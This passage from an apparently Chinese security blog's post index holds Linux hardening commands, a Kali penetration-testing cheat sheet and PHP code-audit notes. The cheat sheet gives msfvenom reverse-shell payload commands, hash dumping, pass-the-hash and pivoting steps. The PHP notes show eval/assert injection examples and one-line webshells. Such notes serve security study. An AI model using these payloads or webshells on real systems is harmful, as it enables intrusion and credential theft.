连接方法：mongodb://&lt;user&gt;:&lt;password&gt;@127.0.0.1:&lt;port&gt;/&lt;db&gt; Connection options =&gt; 链接选项 docs连接成功后创建一个数据库进行测试随意添加一些数据,注意数据为 JSON 格式]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Liunx</tag>
        <tag>Node.js</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 安全加固命令集合]]></title>
    <url>%2Farchives%2F267c870c.html</url>
    <content type="text"><![CDATA[收集 Liunx 系统安全加固时,发现系统漏洞,修复系统,加固系统信息等命令集合find# 使用 uid 查找对应的程序 find / -uid 0 -perm -4000 # 查找哪里拥有写权限 find / -perm -o=w # 查找名称中包含点和空格的文件 find / -name &quot; &quot; -print find / -name &quot;..&quot; -print find / -name &quot;. &quot; -print find / -name &quot; &quot; -print # 查找不属于任何人的文件 find / -nouser # 查找那些文件包含指定文本内容 find / -iname &quot;*&quot; | xrags grep &quot;[String]&quot; # 查找一小时内新增的文件 find / -cmin -60 # 查找所有不可修改的文件 find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’ # 查找 SUID root 文件 find / -user root -perm -4000 -print # 查找 SGID root 文件: find / -group root -perm -2000 -print # 查找 SUID 和 SGID 文件: find / -perm -4000 -o -perm -2000 -print # 查找不属于任何用户的文件: find / -nouser -print # 查找不属于任何用户组的文件: find / -nogroup -print # 查找软连接及其指向: find / -type l -ls lsof# 查找未链接的文件 lsof +L1 # 获取进程打开端口的信息 lsof -i arp# 看看 ARP 表中是否有奇怪的东西 arp -a getent# 查看所有账户 getent passwd # 查看所有用户组 getent group chattr# 使文件不可修改 chattr -i fileKK]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Command</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali 下渗透测试的一些小技巧]]></title>
    <url>%2Farchives%2F7979f023.html</url>
    <content type="text"><![CDATA[总结在渗透测试上的一些小技巧,基本上都是 kali 下的一些常用的工具使用集合DIRB使用 DIRB 爆破目录注：DIRB 是一个专门用于爆破目录的工具,在 Kali 中默认已经安装,类似工具还有国外的 patator,dirsearch,DirBuster, 国内的御剑等等。dirb http://[IP]:PORT /usr/share/dirb/wordlists/common.txt Niko使用 Nikto 扫描 Web 服务nikto -C all -h http://[IP] wpscan使用 wpscan 扫描 WordPressgit clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan ./wpscan –url &lt;http:http://[IP]/&gt; –enumerate p httprint使用 httprint 进行 HTTP 指纹识别wget //www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip cd httprint_301/linux/ ./httprint -h http://[IP] -s signatures.txt Skipfish使用 Skipfish 进行 Web 应用安全注：Skipfish 是一款 Web 应用安全侦查工具,Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图,最终生成的地图会在通过安全检查后输出。skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://[IP] nc使用 nc 进行扫描nc -v -w 1 target -z 1-1000 for i in {101..102};do nc -vv -n -w 1 192.168.56.$i 21-25 -z;done us使用 Unicornscan 进行信息收集和安全审计us -H -msf -Iv 192.168.56.101 -p 1-65535 us -H -mU -Iv 192.168.56.101 -p 1-65535 # -H 在生成报告阶段解析主机名 # -m 扫描类型 (sf - tcp, U - udp) # -Iv - 详细 Xprobe2使用 Xprobe2 识别操作系统指纹xprobe2 -v -p tcp:80:open IP Meterpreter使用 Meterpreter 进行端口转发# //www.offensive-security.com/metasploit-unleashed/portfwd/ # 转发远程端口到目标地址 meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141 kali &gt; rdesktop 127.0.0.1:3389 使用 Meterpreter 获取哈希值git clone https://github.com/byt3bl33d3r/pth-toolkit pth-winexe -U hash http://[IP] cmd # 或者 apt-get install freerdp-x11 xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP # 在或者 meterpreter &gt; run post/windows/gather/hashdump Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c::: msf &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c msf exploit(psexec) &gt; exploit meterpreter &gt; shell 使用 Hashcat 破解密码hashcat -m 400 -a 0 hash /root/rockyou.txt 使用 metasploit 进行穿透route add X.X.X.X 255.255.255.0 1 use auxiliary/server/socks4a run proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E #或者 # //www.offensive-security.com/metasploit-unleashed/pivoting/ meterpreter &gt; ipconfig IP Address : 10.1.13.3 meterpreter &gt; run autoroute -s 10.1.13.0/24 meterpreter &gt; run autoroute -p 10.1.13.0 255.255.255.0 Session 1 meterpreter &gt; Ctrl+Z msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set RHOST 10.1.13.2 msf exploit(psexec) &gt; exploit meterpreter &gt; ipconfig IP Address : 10.1.13.2 sshSSH 穿透ssh -D 127.0.0.1:1080 -p 22 user@IP Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains commands target SSH 穿透从一个网络到另一个网络ssh -D 127.0.0.1:1080 -p 22 user1@IP1 Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2 Add socks4 127.0.0.1 1081 in /etc/proxychains.conf proxychains commands target msfvenomMSF Payloadsmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c MSF 生成在 Linux 下反弹的 Meterpreter Shellmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell MSF 生成反弹 Shell (C Shellcode)msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c MSF 生成反弹 Python Shellmsfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py MSF 生成反弹 ASP Shellmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp MSF 生成反弹 Bash Shellmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh MSF 生成反弹 PHP Shellmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php add &lt;?php at the beginning perl -i~ -0777pe&#39;s/^/&lt;?php \n/&#39; shell.php MSF 生成反弹 Win Shellmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Co]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 代码审计之 PHP 基础知识]]></title>
    <url>%2Farchives%2Fff9c4cbd.html</url>
    <content type="text"><![CDATA[本文主要为学习代码审计前的一些 PHP 基础知识的学习笔记PHP 调试输出方法PHP 常用的调试输出方法echo：输出一个或多个字符串print:输出字符串输出字符串print_r：打印关于变量的易于理解的信息,常用来打印数组var_dump：打印变量的相关信息var_export：输出或返回一个变量的字符串表示echo输出一个或多个字符串,语法说明：void echo ( string $arg1 [, string $... ] ) // 输出所有参数。 echo 不是一个函数（它是一个语言结构）, 因此你不一定要使用小括号来指明参数,单引号,双引号都可以。 echo （不像其他语言构造）不表现得像一个函数, 所以不能总是使用一个函数的上下文。 另外,如果你想给 echo 传递多个参数, 那么就不能使用小括号。print输出字符串,语法说明：int print ( string $arg ) // 输出 arg。 print 实际上不是一个函数（它是一个语言结构）,因此你可以不必使用圆括号来括起它的参数列表。print_r打印关于变量的易于理解的信息,语法说明：bool print_r ( mixed $expression [, bool $return ] ) print_r() 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float,将打印变量值本身。如果给出的是 array,将会按照一定格式显示键和元素。var_dump打印变量的相关信息,语法说明：void var_dump ( mixed $expression [, mixed $... ] ) 此函数显示关于一个或多个表达式的结构信息,包括表达式的类型与值。数组将递归展开值,通过缩进显示其结构。var_export输出或返回一个变量的字符串表示,语法说明：mixed var_export ( mixed $expression [, bool $return ] ) 此函数返回关于传递给该函数的变量的结构信息,它和 var_dump() 类似,不同的是其返回的表示是合法的 PHP 代码。我们也可以通过将函数的第二个参数设置为 TRUE,从而返回变量的表示。另外还有一个函数 debug_zval_dump 可以进行输出,其结果与 vardump 类似,但比 vardump 多一个记录变量被引用次数的值 refcount。这个函数很少使用。tips：PHP 中单引号和双引号的区别。单引号内部的变量不会被执行,双引号内部的变量会被执行。PHP 超全局变量数组PHP 全局变量数组$_SERVER：变量由 Web 服务器设定或直接与当前脚本的执行环境相关联$_ENV：执行环境提交至脚本的变量$_GET：经由 URL 请求提交至脚本的变量$_POST：经由 HTTP POST 方法提交至脚本的变量$_REQUEST：经由 GET,POST 和 COOKIT 机制提交至脚本的变量,因此该数组不值得信任$_FILES：经由 HTTP POST 方法上传而提交至脚本的变量$_COOKIE：经由 HTTP Cookies 方法提交至脚本的变量$_SESSION：当前注册给脚本会话的变量$GLOBALS：包含一个引用指向每个当前脚本的全局范围内有效的变量。改数组的键名为全局变量的名称服务器变量：$_SERVER$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些。例如使用以下代码：&lt;?PHP print_r($_SERVER); ?&gt; 输出为Array ( [HTTP_ACCEPT] =&gt; text/html, application/xhtml+xml [HTTP_ACCEPT_LANGUAGE] =&gt; zh-CN [HTTP_USER_AGENT] =&gt; Mozilla/5.0 (Windows NT 6.1;WOW64;Trident/7.0;rv:11.0) like Gecko [HTTP_ACCEPT_ENCODING] =&gt; gzip, deflate [HTTP_HOST] =&gt; localhost [HTTP_DNT] =&gt; 1 [HTTP_CONNECTION] =&gt; Keep-Alive [PATH] =&gt; C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\; [SystemRoot] =&gt; C:\Windows [COMSPEC] =&gt; C:\Windows\system32\cmd.exe [PATHEXT] =&gt; .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC [WINDIR] =&gt; C:\Windows [SERVER_SIGNATURE] =&gt; [SERVER_SOFTWARE] =&gt; Apache/2.2.21 (Win32) PHP/5.3.10 [SERVER_NAME] =&gt; localhost [SERVER_ADDR] =&gt; 127.0.0.1 [SERVER_PORT] =&gt; 80 [REMOTE_ADDR] =&gt; 127.0.0.1 [DOCUMENT_ROOT] =&gt; D:/wamp/www/ [SERVER_ADMIN] =&gt; admin@localhost [SCRIPT_FILENAME] =&gt; D:/wamp/www/1.php [REMOTE_PORT] =&gt; 50875 [GATEWAY_INTERFACE] =&gt; CGI/1.1 [SERVER_PROTOCOL] =&gt; HTTP/1.1 [REQUEST_METHOD] =&gt; GET [QUERY_STRING] =&gt; [REQUEST_URI] =&gt; /1.php [SCRIPT_NAME] =&gt; /1.php [PHP_SELF] =&gt; /1.php [REQUEST_TIME] =&gt; 1451400854 ) 下面列出了所有 $_SERVER 变量中的重要元素:$_SERVER[&#39;PHP_SELF&#39;]: 当前执行脚本的文件名,与 document root 有关。例如,在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $_SERVER[&#39;PHP_SELF&#39;] 将得到 /test.php/foo.bar。FILE 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始,如果 PHP 以命令行模式运行,这个变量将包含脚本名。之前的版本该变量不可用。$_SERVER[&#39;GATEWAY_INTERFACE&#39;]: 服务器使用的 CGI 规范的版本；例如,”CGI/1.1”。$_SERVER[&#39;SERVER_ADDR&#39;]: 当前运行脚本所在的服务器的 IP 地址。|$_SERVER[&#39;SERVER_NAME&#39;]: 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中,该名称是由那个虚拟主机所设置的值决定。$_SERVER[&#39;SERVER_SOFTWARE&#39;]: 服务器标识字符串,在响应请求时的头信息中给出。 (如：Apache/2.2.24)$_SERVER[&#39;SERVER_PROTOCOL&#39;]: 请求页面时通信协议的名称和版本。例如,”HTTP/1.0”。$_SERVER[&#39;REQUEST_METHOD&#39;]: 访问页面使用的请求方法；例如,”GET”, “HEAD”,”POST”,”PUT”。$_SERVER[&#39;REQUEST_TIME&#39;]: 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)$_SERVER[&#39;QUERY_STRING&#39;]: query string（查询字符串）,如果有的话,通过它进行页面访问。$_SERVER[&#39;HTTP_ACCEPT&#39;]: 当前请求头中 Accept: 项的内容,如果存在的话。$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]: 当前请求头中 Accept-Charset: 项的内容,如果存在的话。例如：”iso-8859-1,*,utf-8”。$_SERVER[&#39;HTTP_HOST&#39;]: 当前请求头中 Host: 项的内容,如果存在的话。$_SERVER[&#39;HTTP_REFERER&#39;]:引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项,有的还提供了修改 HTTP_REFERER 的功能。简言之,该值并不可信。)$_SERVER[&#39;HTTPS&#39;]: 如果脚本是通过 HTTPS 协议被访问,则被设为一个非空的值。$_SERVER[&#39;REMOTE_ADDR&#39;]: 浏览当前页面的用户的 IP 地址。$_SERVER[&#39;REMOTE_HOST&#39;]: 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。$_SERVER[&#39;REMOTE_PORT&#39;]: 用户机器上连接到 Web 服务器所使用的端口号。$_SERVER[&#39;SCRIPT_FILENAME&#39;]: 当前执行脚本的绝对路径。$_SERVER[&#39;SERVER_ADMIN&#39;]: 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上,则该值是那个虚拟主机的值。（如：admin@localhost）$_SERVER[&#39;SERVER_PORT&#39;]: Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接,则这个值为用户设置的 HTTP 端口。$_SERVER[&#39;SERVER_SIGNATURE&#39;]: 包含了服务器版本和虚拟主机名的字符串。$_SERVER[&#39;PATH_TRANSLATED&#39;]: 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。$_SERVER[&#39;SCRIPT_NAME&#39;]: 包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本(例如包含文件)的完整路径和文件名。$_SERVER[&#39;SCRIPT_URI&#39;]: URI 用来指定要访问的页面。例如 “/index.html”。环境变量：$_ENV$_ENV 数组中的内容是在 PHP 解析器运行时,从 PHP 所在服务器中的环境变量转变为 PHP 全局变量的。它们中的许多都是由 PHP 所运行的系统决定的,完整的列表是不可能的,需要查看 PHP 所在的服务器的系统文档以确定其特定的环境变量。我们可以使用以下代码输出 $_ENV 的全部信息：&lt;?php print_r($_ENV); ?&gt; 输出为Array ( [ALLUSERSPROFILE] =&gt; C:\ProgramData [APPDATA] =&gt; C:\Windows\system32\config\systemprofile\AppData\Roaming [CommonProgramFiles] =&gt; C:\Program Files (x86)\Common Files [CommonProgramFiles(x86)] =&gt; C:\Program Files (x86)\Common Files [CommonProgramW6432] =&gt; C:\Program Files\Common Files [COMPUTERNAME] =&gt; WIN-46K74EGCQQV [ComSpec] =&gt; C:\Windows\system32\cmd.exe [FP_NO_HOST_CHECK] =&gt; NO [LOCALAPPDATA] =&gt; C:\Windows\system32\config\systemprofile\AppData\Local [NUMBER_OF_PROCESSORS] =&gt; 2 [OS] =&gt; Windows_NT [Path] =&gt; C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Python27\ [PATHEXT] =&gt; .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC [PROCESSOR_ARCHITECTURE] =&gt; x86 [PROCESSOR_ARCHITEW6432] =&gt; AMD64 [PROCESSOR_IDENTIFIER] =&gt; Intel64 Family 6 Model 63 Stepping 2, GenuineIntel [PROCESSOR_LEVEL] =&gt; 6 [PROCESSOR_REVISION] =&gt; 3f02 [ProgramData] =&gt; C:\ProgramData [ProgramFiles] =&gt; C:\Program Files (x86) [ProgramFiles(x86)] =&gt; C:\Program Files (x86) [ProgramW6432] =&gt; C:\Program Files [PSModulePath] =&gt; C:\Windows\system32\WindowsPowerShell\v1.0\Modules\ [PUBLIC] =&gt; C:\Users\Public [SystemDrive] =&gt; C: [SystemRoot] =&gt; C:\Windows [TEMP] =&gt; C:\Windows\TEMP [TMP] =&gt; C:\Windows\TEMP [USERDOMAIN] =&gt; WORKGROUP [USERNAME] =&gt; WIN-46K74EGCQQV$ [USERPROFILE] =&gt; C:\Windows\system32\config\systemprofile [windir] =&gt; C:\Windows [windows_tracing_flags] =&gt; 3 [windows_tracing_logfile] =&gt; C:\BVTBin\Tests\installpackage\csilogfile.log [AP_PARENT_PID] =&gt; 2832 ) 注：如果 $_ENV 输出为空,是因为 php.ini 中的 variables_order 值为 “GPCS”,也就是说系统在定义 PHP 预定义变量时的顺序是 GET,POST,COOKIES 和 SERVER,没有定义 Environment(E),只需要将 variables_order 值修改为 “EGPCS” 即可。URL GET 变量：$_GET$_GET 数组是通过 URL GET 方法传递的变量组成的数组。它属于外部变量,即在服务器页面中通过 $_GET 数组获取 URL 方法传递过来的参数。例如服务器端有如下代码：&lt;?php echo &#39;参数action的值为：&#39;.$_GET[&quot;action&quot;].&#39;&lt;br&gt;&#39;; echo &#39;参数username的值为：&#39;.$_GET[&quot;username&quot;].&#39;&lt;br&gt;&#39;; echo &#39;参数password的值为：&#39;.$_GET[&quot;password&quot;].&#39;&lt;br&gt;&#39;; ?&gt; 然后使用以下 URL 进行访问：//localhost/1.php?action=login&amp;username=admin&amp;password=admin 输出即为：参数 action 的值为：login参数 username 的值为：admin参数 password 的值为：adminHTTP POST 变量：$_POST$_POST 数组类似于 $_GET 数组,不过是通过 HTTP POST 传递的变量组成的数组。$_GET 和 $_POST 都可以保存表单提交的变量,具体使用哪一种方法依据表单 form 标记中的 method 方法为 POST 或是 GET。例如以下代码构造一个登陆界面：login.html&lt;html&gt; &lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html;charset=utf-8&#39; /&gt; &lt;head&gt; &lt;title&gt;登陆&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;login_check.php&quot; method=&quot;post&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt; 密 码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; login_check.php&lt;?php echo &#39;name:&#39;.$_POST[&quot;name&quot;].&#39;&lt;br&gt;&#39;; echo &#39;password:&#39;.$_POST[&quot;password&quot;].&#39;&lt;br&gt;&#39;; ?&gt; 这样在我们登陆过后就会显示我们 POST 提交的数据了：name:adminpassword:adminrequest 变量：$_REQUEST$_REQUEST 数组包含 $_GET,$_POST 和 $_COOKIE 中的全部内容。假设表单内有一个输入域名为 name=”name”,如果通过 GET 方法提交,我们可以使用 $_GET[“name”] 进行访问；如果通过 POST 方法提交,我们可以使用 $_POST[“name”] 进行访问。但无论是通过 GET 或是 POST 提交的,我们都可以使用 $_REQUEST[“name”] 进行访问。不过 $_REQUEST 速度较慢,而且较不安全,所以不推荐使用。HTTP 文件上传变量：$_FILES使用表单的 file 输入域上传文件时,必须使用 POST 提交。但在服务器文件中,并不能通过 $_POST 获取到表单中的 file 域的内容。而 $_FILES 数据就是表单通过 POST 上传文件项目组成的数组。$_FILES 数组是一个二维数组,包含 5 个字数组元素：$_FILES[&quot;file&quot;][&quot;name&quot;]：客户端机器文件的原名称,包含扩展名$_FILES[&quot;file&quot;][&quot;size&quot;]：已上传文件的大小,单位为字节$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]：伴随上传时产生的错误信息,有 5 个可能的值0：表示没有发生任何错误,文件上传成功1：表示上传文件的大小超出了在 PHP 配置文件中指令 upload maxfilesize 选项限制的值2：表示上传文件的大小超出了 HTML 表单中 MAXFILESIZE 选项所指定的值3：表示文件只被部分上传4：表示没有上传任何文件$_FILES[&quot;file&quot;][&quot;error&quot;]$_FILES[&quot;file&quot;][&quot;type&quot;]下面简单构造一个文件上传的实例：file.html&lt;html&gt; &lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html;charset=utf-8&#39; /&gt; &lt;head&gt; &lt;title&gt;上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; upload.php&lt;?php echo &#39;$_FILES[&quot;file&quot;][&quot;name&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;name&quot;].&#39;&lt;br&gt;&#39;; echo &#39;$_FILES[&quot;file&quot;][&quot;size&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;size&quot;].&#39;&lt;br&gt;&#39;; echo &#39;$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&#39;&lt;br&gt;&#39;; echo &#39;$_FILES[&quot;file&quot;][&quot;error&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;error&quot;].&#39;&lt;br&gt;&#39;; echo &#39;$_FILES[&quot;file&quot;][&quot;type&quot;] = &#39;.$_FILES[&quot;file&quot;][&quot;type&quot;].&#39;&lt;br&gt;&#39;; ?&gt; 当不选择文件直接点击按钮时结果为：$_FILES[“file”][“name”] =$_FILES[“file”][“size”] = 0$_FILES[“file”][“tmp_name”] =$_FILES[“file”][“error”] = 4$_FILES[“file”][“type”] =当选择一个普通文件上传时结果为：$_FILES[“file”][“name”] = test.txt$_FILES[“file”][“size”] = 383$_FILES[“file”][“tmp_name”] = D:\wamp\tmp\phpFEE0.tmp$_FILES[“file”][“error”] = 0$_FILES[“file”][“type”] = text/plainHTTP Cookies：$_COOKIE$_COOKIE 数组是经由 HTTP Cookies 方法提交至脚本的变量。通常这些 Cookies 是由以前执行的 PHP 脚本通过 setCookie() 函数设置到客户端浏览器中的,当 PHP 脚本从客户浏览器提取了一个 cookie 后,它将自动的把它转换成一个变量,可以通过 $_COOKIE 数组和 cookie 名称来存取指定的 cookie 值。下面示例代码打印出当前会话的 Cookies：&lt;?php //向客户端发送一个Cookie,将变量name值为admin,保存客户端一周的时间 setcookie(&quot;name&quot;,&quot;admin&quot;,time()+60_60_24*7); print_r($_COOKIE); ?&gt; 刷新两次后看到结果为：Array ( [name] =&gt; admin ) Session 变量：$_SESSION会话控制是在服务器端使用 session 跟踪用户。当服务器页面中使用 session_start() 函数开启 session 后,就可以使用 $_SESSION 数组注册全局变量,用户可以在整个网站中访问这些会话信息。变量：$GLOBALS$GLOBALS 是由所有已定义的全局变量组成的数组,变量名就是该数组的索引。在所有的脚本中都有效,在函数或对象的方法中不需要使用 global 关键字访问它。所以在函数中使用函数外部声明的全局变量时,可以使用 $GLOBALS 数组代替 global 关键字。下面是示例代码：&lt;?php $x = 75; $y = 25; function addition() { echo $GLOBALS[&#39;z&#39;] = $GLOBALS[&#39;x&#39;] + $GLOBALS[&#39;y&#39;]; } addition(); ?&gt; PHP 执行系统外部命令PHP 用于执行系统外部命令的函数有：system()：输出并返回最后一行 shell 结果exec()：不输出结果,返回最后一行 shell 结果,所有结果可以保存到一个返回的数组里面passthru()：只调用命令,把命令的运行结果原样地直接输出到标准输出设备上shell_exec：通过 shell 环境执行命令,并且将完整的输出以字符串的方式返回popen：打开一个指向进程的管道,该进程由派生给定的 command 命令执行而产生proc_open：类似 popen() 函数, 但是 proc_open() 提供了更加强大的控制程序执行的能力pcntl_exec：在当前进程空间执行指定程序``(反引号)：反引号中的内容作为外壳命令来执行,并将其输出信息返回。效果与 shell_exec() 函数相同。PHP 代码执行函数常见的代码执行函数有 3 个：eval：把字符串作为 PHP 代码执行assert：检查一个断言是否为 FALSEpreg_replace：执行一个正则表达式的搜索和替换eval把字符串作为 PHP 代码执行,说明：mixed eval ( string $code ) 把字符串 code 作为 PHP 代码执行。另外 eval() 是一个语言构造器而不是一个函数,不能被可变函数调用。eval() 返回 NULL,除非在执行的代码中 return 了一个值,函数返回传递给 return 的值。 如果在执行的代码中有一个解析错误,eval() 返回 FALSE,之后的代码将正常执行。下面示例为简单的文本合并：&lt;?php $string = &#39;cup&#39;; $name = &#39;coffee&#39;; $str = &#39;This is a $string with my $name in it.&#39;; echo $str. &quot;&lt;br&gt;&quot;; eval(&quot;\$str = \&quot;$str\&quot;;&quot;);//执行命令为$str=&quot;$str&quot;; echo $str. &quot;&lt;br&gt;&quot;; ?&gt; 输出为This is a $string with my $name in it. This is a cup with my coffee in it. 下面在举另一个常见的命令注入的例子：&lt;?php if(isset($_GET[&#39;cmd&#39;])){ $cmd = $_GET[&#39;cmd&#39;]; eval(&quot;\$cmd=$cmd;&quot;); } ?&gt; 然后我们访问 URL http://localhost/test.php?cmd=phpinfo%28%29 就可以看到 phpinfo() 信息了。另外最常见的 PHP 一句话木马就是 eval() 构成的：&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; assert检查一个断言是否为 FALSE。说明：bool assert ( mixed $assertion [, string $description ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。如果 assertion 是字符串,它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小,并且在断言失败时消息会包含_ assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion,这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时,条件会转换为字符串,而布尔值 FALSE 会被转换成空字符串。assert() 的注入代码跟 eval() 类似,经常在 eval 关键字被屏蔽时使用 assert 代替,直接将上面示例中的 eval 改为 assert 即可：&lt;?php if(isset($_GET[&#39;cmd&#39;])){ $cmd = $_GET[&#39;cmd&#39;]; assert(&quot;\$cmd=$cmd;&quot;); } ?&gt; 同样访问 URL http://localhost/test.php?cmd=phpinfo%28%29 就可以看到 phpinfo() 信息了。另外使用 assert 的一句话木马为：&lt;?php @assert($_POST[&#39;pass&#39;]);?&gt; preg_replace执行一个正则表达式的搜索和替换,说明：mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分,以 replacement 进行替换。函数将返回替换后的字符串,当 pattern 参数使用 /e 修正符时,preg_replace 函数会将 replacement 参数当作 PHP 代码执行,那么,针对此种情况,当 replacement 内容为用户可控数据时,就可能导致命令注入攻击漏洞的形成。为了测试 preg_replace 函数,我们构造 PHP 代码如下：&lt;?php $string = &quot;hello world&quot;; $pattern = &quot;/^/e&quot;; echo preg_replace($pattern, $_GET[&quot;str&quot;], $string); ?&gt; 然后访问 http://localhost/test.php?str=phpinfo%28%29 就可以看到 phpinfo() 信息了。]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在 windows 下安装 Cmder]]></title>
    <url>%2Farchives%2F447494ff.html</url>
